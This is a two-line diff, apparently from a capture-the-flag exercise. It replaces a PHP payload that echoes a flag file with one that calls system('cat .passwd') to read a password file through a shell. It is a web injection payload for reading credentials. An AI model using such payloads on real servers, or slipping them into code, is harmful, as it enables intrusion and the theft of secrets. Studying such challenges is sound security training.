@@ -1,1 +1,1 @@
-ECHO READFILE('FLAG.PHP');
+system('cat .passwd');
